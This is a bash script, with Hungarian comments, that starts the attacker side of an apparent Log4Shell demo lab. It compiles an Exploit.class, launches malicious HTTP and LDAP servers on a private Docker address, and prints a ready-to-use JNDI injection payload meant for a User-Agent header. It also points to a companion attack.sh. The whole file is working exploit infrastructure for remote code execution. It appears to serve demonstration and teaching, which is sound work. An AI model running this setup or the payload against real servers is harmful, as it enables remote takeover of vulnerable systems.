#!/bin/bash
set -e

ATTACKER_IP="${ATTACKER_IP:-172.20.0.10}"

echo "=============================================="
echo " Log4Shell Demo - Támadó infrastruktúra"
echo " LDAP:  ${ATTACKER_IP}:1389"
echo " HTTP:  ${ATTACKER_IP}:8888"
echo "=============================================="

# Ellenőrzés: Exploit.class megvan?
if [ ! -f "/attacker/http-server/Exploit.class" ]; then
    echo "[!] Exploit.class nem található, újrafordítás..."
    cd /attacker
    javac -source 8 -target 8 Exploit.java 2>/dev/null || javac Exploit.java
    cp Exploit.class ./http-server/Exploit.class
fi

echo "[*] Exploit.class mérete: $(wc -c < /attacker/http-server/Exploit.class) byte"

# HTTP szerver indítása (háttérben)
echo "[*] HTTP szerver indítása (port 8888)..."
cd /attacker/http-server
python3 http_server.py &
HTTP_PID=$!

sleep 1

# LDAP szerver indítása (előtérben)
echo "[*] LDAP szerver indítása (port 1389)..."
cd /attacker/ldap-server
export ATTACKER_IP
python3 ldap_server.py &
LDAP_PID=$!

echo ""
echo "=============================================="
echo " Infrastruktúra KÉSZ!"
echo " "
echo " Exploit payload (User-Agent fejlécbe):"
echo ' ${jndi:ldap://172.20.0.10:1389/exploit}'
echo " "
echo " Vagy használd a attack.sh szkriptet:"
echo "   docker exec attacker /attacker/attack.sh"
echo "=============================================="

# Várakozás
wait $LDAP_PID $HTTP_PID
